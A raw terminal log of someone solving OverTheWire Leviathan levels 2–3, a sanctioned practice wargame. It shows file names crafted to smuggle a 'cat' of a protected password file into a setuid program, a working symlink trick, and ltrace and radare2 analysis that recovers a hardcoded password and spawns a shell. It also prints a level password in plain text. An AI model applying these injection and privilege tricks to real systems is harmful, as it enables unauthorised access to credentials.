leviathan2@leviathan:/tmp/la$ touch h\ ;cat\ /etv/leviathan_pass/leviathan3
-bash: cat /etv/leviathan_pass/leviathan3: No such file or directory
leviathan2@leviathan:/tmp/la$ touch \h\ ;cat\ /etv/leviathan_pass/leviathan3
-bash: cat /etv/leviathan_pass/leviathan3: No such file or directory
leviathan2@leviathan:/tmp/la$ touch h\ \;cat\ /etv/leviathan_pass/leviathan3
touch: cannot touch 'h ;cat /etv/leviathan_pass/leviathan3': No such file or directory
leviathan2@leviathan:/tmp/la$ touch h\ \;cat\ \/etc\/leviathan_pass\/leviathan3
touch: cannot touch 'h ;cat /etc/leviathan_pass/leviathan3': No such file or directory
leviathan2@leviathan:/tmp/la$ touch h\ cat\ \/etc\/leviathan_pass\/leviathan3
touch: cannot touch 'h cat /etc/leviathan_pass/leviathan3': No such file or directory
leviathan2@leviathan:/tmp/la$ touch " h\ cat\ \/etc\/leviathan_pass\/leviathan3"
touch: cannot touch ' h\ cat\ \/etc\/leviathan_pass\/leviathan3': No such file or directory
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$ touch a\ b
leviathan2@leviathan:/tmp/la$ ls
a b  h   hello  leviathan2  leviathan3
leviathan2@leviathan:/tmp/la$ touch a\ cat\ \/etc
touch: cannot touch 'a cat /etc': No such file or directory
leviathan2@leviathan:/tmp/la$ touch a\ cat\ /etc
touch: cannot touch 'a cat /etc': No such file or directory
leviathan2@leviathan:/tmp/la$ touch a\ cat\ \\/etc
touch: cannot touch 'a cat \/etc': No such file or directory
leviathan2@leviathan:/tmp/la$ touch a\ cat\ etc
leviathan2@leviathan:/tmp/la$ ls
a b  a cat etc  h   hello  leviathan2  leviathan3
leviathan2@leviathan:/tmp/la$ touch a\ cat\ etc
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$
leviathan2@leviathan:/tmp/la$ ll
total 20
drwxrwxr-x   2 leviathan2 leviathan2  4096 Jan  9 09:02 ./
drwxrwx-wt 272 root       root       16384 Jan  9 09:00 ../
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:01 a b
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:03 a cat etc
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:00 h
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 08:58 hello
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 08:44 leviathan2 -> /etc/leviathan_pass/leviathan2
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 08:43 leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:/tmp/la$ ~/printfile leviathan3
You cant have that file...
leviathan2@leviathan:/tmp/la$ touche leviathan2\ a
No command 'touche' found, did you mean:
 Command 'touch' from package 'coreutils' (main)
touche: command not found
leviathan2@leviathan:/tmp/la$ touch leviathan2\ a
leviathan2@leviathan:/tmp/la$ ~/printfile "leviathan3 a"
You cant have that file...
leviathan2@leviathan:/tmp/la$ ltrace ~/printfile "leviathan3 a"
__libc_start_main(0x804858d, 2, 0xffffd6a4, 0x8048680 <unfinished ...>
access("leviathan3 a", 4)                                                                = -1
puts("You cant have that file..."You cant have that file...
)                                                       = 27
+++ exited (status 1) +++
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
ln: failed to create symbolic link '/tmp/jhalon/pass': File exists
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalo/pass
ln: failed to create symbolic link '/tmp/jhalo/pass': No such file or directory
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/ll/pass
ln: failed to create symbolic link '/tmp/ll/pass': No such file or directory
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/ll999/pass
ln: failed to create symbolic link '/tmp/ll999/pass': No such file or directory
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/ll99900/pass
ln: failed to create symbolic link '/tmp/ll99900/pass': No such file or directory
leviathan2@leviathan:/tmp/la$ ln -s /etc/leviathan_pass/leviathan3 /tmp/la/pass
leviathan2@leviathan:/tmp/la$ ~/printfile pass
You cant have that file...
leviathan2@leviathan:/tmp/la$ touch "pass\ a"
leviathan2@leviathan:/tmp/la$ ;;
-bash: syntax error near unexpected token `;;'
leviathan2@leviathan:/tmp/la$ ll
total 20
drwxrwxr-x   2 leviathan2 leviathan2  4096 Jan  9 09:08 ./
drwxrwx-wt 274 root       root       16384 Jan  9 09:08 ../
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:01 a b
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:03 a cat etc
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:00 h
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 08:58 hello
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 08:44 leviathan2 -> /etc/leviathan_pass/leviathan2
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:04 leviathan2 a
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 08:43 leviathan3 -> /etc/leviathan_pass/leviathan3
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 09:07 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r--   1 leviathan2 leviathan2     0 Jan  9 09:08 pass\ a
leviathan2@leviathan:/tmp/la$ ~/printfile "pass a"
You cant have that file...
leviathan2@leviathan:/tmp/la$ touch pass\ a
leviathan2@leviathan:/tmp/la$ ~/printfile "pass a"
Ahdiemoo1j
/bin/cat: a: No such file or directory
leviathan2@leviathan:/tmp/la$ ltrace ~/printfile "pass a"
__libc_start_main(0x804858d, 2, 0xffffd6a4, 0x8048680 <unfinished ...>
access("pass a", 4)                                                                      = 0
snprintf("/bin/cat pass a", 511, "/bin/cat %s", "pass a")                                = 15
geteuid()                                                                                = 12002
geteuid()                                                                                = 12002
setreuid(12002, 12002)                                                                   = 0
system("/bin/cat pass a"/bin/cat: pass: Permission denied
/bin/cat: a: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 256
+++ exited (status 0) +++
leviathan2@leviathan:/tmp/la$ ^C
leviathan2@leviathan:/tmp/la$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~
➜  ~ ssh leviathan3@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan3@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan3@leviathan:~$ ll
total 32
drwxr-xr-x  2 root       root        4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root        4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root         220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root        3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root         655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan4 leviathan3 10176 Nov 13 16:03 level3*
leviathan3@leviathan:~$ ./level3
Enter the password> 123
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace level3
Can't execute `level3': No such file or directory
failed to initialize process 10621: No such file or directory
couldn't open program 'level3': No such file or directory
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x804867e, 1, 0xffffd6f4, 0x8048750 <unfinished ...>
strcmp("h0no33", "kakaka")                                                               = -1
printf("Enter the password> ")                                                           = 20
fgets(Enter the password> lambdax
"lambdax\n", 256, 0xf7fc75a0)                                                      = 0xffffd4ec
strcmp("lambdax\n", "snlprintf\n")                                                       = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                               = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ltrace ./level3 lambdax
__libc_start_main(0x804867e, 2, 0xffffd6d4, 0x8048750 <unfinished ...>
strcmp("h0no33", "kakaka")                                                               = -1
printf("Enter the password> ")                                                           = 20
fgets(Enter the password> ^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
leviathan3@leviathan:~$ env
XDG_SESSION_ID=10426
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=210.12.101.154 1892 22
SSH_TTY=/dev/pts/5
LC_ALL=C
USER=leviathan3
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
TMOUT=1800
MAIL=/var/mail/leviathan3
PATH=/home/leviathan3/bin:/home/leviathan3/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
PWD=/home/leviathan3
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/leviathan3
LANGUAGE=en_US:en
LOGNAME=leviathan3
SSH_CONNECTION=210.12.101.154 1892 192.168.101.60 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/12003
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x804867e, 1, 0xffffd6f4, 0x8048750 <unfinished ...>
strcmp("h0no33", "kakaka")                                                               = -1
printf("Enter the password> ")                                                           = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7fc75a0)                                                    = 0xffffd4ec
strcmp("snlprintf\n", "snlprintf\n")                                                     = 0
puts("[You've got shell]!"[You've got shell]!
)                                                              = 20
geteuid()                                                                                = 12003
geteuid()                                                                                = 12003
setreuid(12003, 12003)                                                                   = 0
system("/bin/sh"$ ls
level3
$ bash
leviathan3@leviathan:~$ id
uid=12003(leviathan3) gid=12003(leviathan3) groups=12003(leviathan3)
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan4
cat: /etc/leviathan_pass/leviathan4: Permission denied
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
leviathan3@leviathan:~$ exit
exit
$ exit
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 0
+++ exited (status 0) +++
leviathan3@leviathan:~$ id
uid=12003(leviathan3) gid=12003(leviathan3) groups=12003(leviathan3)
leviathan3@leviathan:~$ r2 level3
.bash_logout  .bashrc       .profile      level3
leviathan3@leviathan:~$ r2 level3
 -- Change your fortune types with 'e cfg.fortunes.type = fun,tips,nsfw' in your ~/.radare2rc
[0x080484b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x080484b0]> pdf
            ;-- section..text:
            ;-- eip:
/ (fcn) entry0 33
|   entry0 ();
|           0x080484b0      31ed           xor ebp, ebp                ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text
|           0x080484b2      5e             pop esi
|           0x080484b3      89e1           mov ecx, esp
|           0x080484b5      83e4f0         and esp, 0xfffffff0
|           0x080484b8      50             push eax
|           0x080484b9      54             push esp
|           0x080484ba      52             push edx
|           0x080484bb      68b0870408     push sym.__libc_csu_fini    ; 0x80487b0
|           0x080484c0      6850870408     push sym.__libc_csu_init    ; 0x8048750 ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"
|           0x080484c5      51             push ecx
|           0x080484c6      56             push esi
|           0x080484c7      687e860408     push main                   ; sym.main ; 0x804867e ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"
\           0x080484cc      e8bfffffff     call sym.imp.__libc_start_main ; int __libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end)
[0x080484b0]> pdf@main
            ;-- main:
/ (fcn) main 201
|   main ();
|           ; var int local_4h @ esp+0x4
|           ; var int local_1ch @ esp+0x1c
|           ; var int local_23h @ esp+0x23
|           ; var int local_27h @ esp+0x27
|           ; var int local_29h @ esp+0x29
|           ; var int local_2ah @ esp+0x2a
|           ; var int local_2eh @ esp+0x2e
|           ; var int local_30h @ esp+0x30
|           ; var int local_31h @ esp+0x31
|           ; var int local_35h @ esp+0x35
|           ; var int local_37h @ esp+0x37
|           ; var int local_38h @ esp+0x38
|           ; var int local_3ch @ esp+0x3c
|           ; var int local_40h @ esp+0x40
|           ; var int local_42h @ esp+0x42
|           ; var int local_46h @ esp+0x46
|           ; var int local_4ah @ esp+0x4a
|           ; var int local_4ch @ esp+0x4c
|              ; DATA XREF from 0x080484c7 (entry0)
|           0x0804867e      55             push ebp                    ; .//level3.c:25
|           0x0804867f      89e5           mov ebp, esp
|           0x08048681      83e4f0         and esp, 0xfffffff0
|           0x08048684      83ec50         sub esp, 0x50               ; 'P'
|           0x08048687      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x0804868d      8944244c       mov dword [local_4ch], eax
|           0x08048691      31c0           xor eax, eax
|           0x08048693      c7442423626f.  mov dword [local_23h], 0x626d6f62 ; .//level3.c:26 ; [0x626d6f62:4]=-1
|           0x0804869b      66c744242761.  mov word [local_27h], 0x6461 ; [0x6461:2]=0xffff
|           0x080486a2      c644242900     mov byte [local_29h], 0
|           0x080486a7      c74424382e2e.  mov dword [local_38h], 0x732e2e2e ; .//level3.c:27 ; [0x732e2e2e:4]=-1
|           0x080486af      c744243c3363.  mov dword [local_3ch], 0x33726333 ; [0x33726333:4]=-1
|           0x080486b7      66c744244074.  mov word [local_40h], 0x74  ; 't' ; [0x74:2]=0xffff ; 116
|           0x080486be      c744242a6830.  mov dword [local_2ah], 0x6f6e3068 ; .//level3.c:29 ; [0x6f6e3068:4]=-1
|           0x080486c6      66c744242e33.  mov word [local_2eh], 0x3333 ; [0x3333:2]=0xffff
|           0x080486cd      c644243000     mov byte [local_30h], 0
|           0x080486d2      c74424316b61.  mov dword [local_31h], 0x616b616b ; .//level3.c:30 ; [0x616b616b:4]=-1
|           0x080486da      66c74424356b.  mov word [local_35h], 0x616b ; [0x616b:2]=0xffff
|           0x080486e1      c644243700     mov byte [local_37h], 0
|           0x080486e6      c74424422a33.  mov dword [local_42h], 0x2e32332a ; .//level3.c:31 ; [0x2e32332a:4]=-1
|           0x080486ee      c7442446322a.  mov dword [local_46h], 0x785b2a32 ; [0x785b2a32:4]=-1
|           0x080486f6      66c744244a5d.  mov word [local_4ah], 0x5d  ; ']' ; [0x5d:2]=0xffff ; 93
|           0x080486fd      8d442431       lea eax, [local_31h]        ; .//level3.c:34 ; 0x31 ; '1' ; 49
|           0x08048701      89442404       mov dword [local_4h], eax
|           0x08048705      8d44242a       lea eax, [local_2ah]        ; 0x2a ; '*' ; 42
|           0x08048709      890424         mov dword [esp], eax
|           0x0804870c      e8fffcffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x08048711      85c0           test eax, eax
|       ,=< 0x08048713      7508           jne 0x804871d
|       |   0x08048715      c744241c0100.  mov dword [local_1ch], 1    ; .//level3.c:35
|       |      ; JMP XREF from 0x08048713 (main)
|       `-> 0x0804871d      c70424ff8704.  mov dword [esp], str.Enter_the_password_ ; .//level3.c:37 ; [0x80487ff:4]=0x65746e45 ; "Enter the password> "
|           0x08048724      e8f7fcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048729      e87ffeffff     call sym.do_stuff           ; .//level3.c:39
|           0x0804872e      b800000000     mov eax, 0                  ; .//level3.c:41
|           0x08048733      8b54244c       mov edx, dword [local_4ch]  ; .//level3.c:42 ; [0x4c:4]=-1 ; 'L' ; 76
|           0x08048737      653315140000.  xor edx, dword gs:[0x14]
|       ,=< 0x0804873e      7405           je 0x8048745
|       |   0x08048740      e8fbfcffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x0804873e (main)
|       `-> 0x08048745      c9             leave
\           0x08048746      c3             ret
[0x080484b0]> pdf@do_stuff
Invalid address (do_stuff)
|ERROR| Invalid command 'pdf@do_stuff' (0x70)
[0x080484b0]> pdf@sym.do_stuff
/ (fcn) sym.do_stuff 209
|   sym.do_stuff ();
|           ; var int local_117h @ ebp-0x117
|           ; var int local_113h @ ebp-0x113
|           ; var int local_10fh @ ebp-0x10f
|           ; var int local_10dh @ ebp-0x10d
|           ; var int local_10ch @ ebp-0x10c
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|              ; CALL XREF from 0x08048729 (main)
|           0x080485ad      55             push ebp                    ; .//level3.c:7
|           0x080485ae      89e5           mov ebp, esp
|           0x080485b0      53             push ebx
|           0x080485b1      81ec24010000   sub esp, 0x124
|           0x080485b7      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x080485bd      8945f4         mov dword [local_ch], eax
|           0x080485c0      31c0           xor eax, eax
|           0x080485c2      c785e9feffff.  mov dword [local_117h], 0x706c6e73 ; .//level3.c:9
|           0x080485cc      c785edfeffff.  mov dword [local_113h], 0x746e6972
|           0x080485d6      66c785f1feff.  mov word [local_10fh], 0xa66 ; 2662
|           0x080485df      c685f3feffff.  mov byte [local_10dh], 0
|           0x080485e6      a140a00408     mov eax, dword [obj.stdin]  ; .//level3.c:10 ; [0x804a040:4]=0
|           0x080485eb      89442408       mov dword [local_8h], eax
|           0x080485ef      c74424040001.  mov dword [local_4h], 0x100 ; [0x100:4]=-1 ; 256
|           0x080485f7      8d85f4feffff   lea eax, [local_10ch]
|           0x080485fd      890424         mov dword [esp], eax
|           0x08048600      e82bfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048605      8d85e9feffff   lea eax, [local_117h]       ; .//level3.c:12
|           0x0804860b      89442404       mov dword [local_4h], eax
|           0x0804860f      8d85f4feffff   lea eax, [local_10ch]
|           0x08048615      890424         mov dword [esp], eax
|           0x08048618      e8f3fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x0804861d      85c0           test eax, eax
|       ,=< 0x0804861f      7532           jne 0x8048653
|       |   0x08048621      c70424d08704.  mov dword [esp], str._You_ve_got_shell__ ; .//level3.c:13 ; [0x80487d0:4]=0x756f595b ; "[You've got shell]!"
|       |   0x08048628      e833feffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0804862d      e81efeffff     call sym.imp.geteuid        ; .//level3.c:14 ; uid_t geteuid(void)
|       |   0x08048632      89c3           mov ebx, eax
|       |   0x08048634      e817feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x08048639      895c2404       mov dword [local_4h], ebx
|       |   0x0804863d      890424         mov dword [esp], eax
|       |   0x08048640      e83bfeffff     call sym.imp.setreuid
|       |   0x08048645      c70424e48704.  mov dword [esp], str._bin_sh ; .//level3.c:15 ; [0x80487e4:4]=0x6e69622f ; "/bin/sh"
|       |   0x0804864c      e81ffeffff     call sym.imp.system         ; int system(const char *string)
|      ,==< 0x08048651      eb0c           jmp 0x804865f
|      ||      ; JMP XREF from 0x0804861f (sym.do_stuff)
|      |`-> 0x08048653      c70424ec8704.  mov dword [esp], str.bzzzzzzzzap._WRONG ; .//level3.c:17 ; [0x80487ec:4]=0x7a7a7a62 ; "bzzzzzzzzap. WRONG"
|      |    0x0804865a      e801feffff     call sym.imp.puts           ; int puts(const char *s)
|      |       ; JMP XREF from 0x08048651 (sym.do_stuff)
|      `--> 0x0804865f      b800000000     mov eax, 0                  ; .//level3.c:20
|           0x08048664      8b55f4         mov edx, dword [local_ch]   ; .//level3.c:21
|           0x08048667      653315140000.  xor edx, dword gs:[0x14]
|       ,=< 0x0804866e      7405           je 0x8048675
|       |   0x08048670      e8cbfdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x0804866e (sym.do_stuff)
|       `-> 0x08048675      81c424010000   add esp, 0x124
|           0x0804867b      5b             pop ebx
|           0x0804867c      5d             pop ebp
\           0x0804867d      c3             ret
[0x080484b0]> VV
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5







                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5







                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5


                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
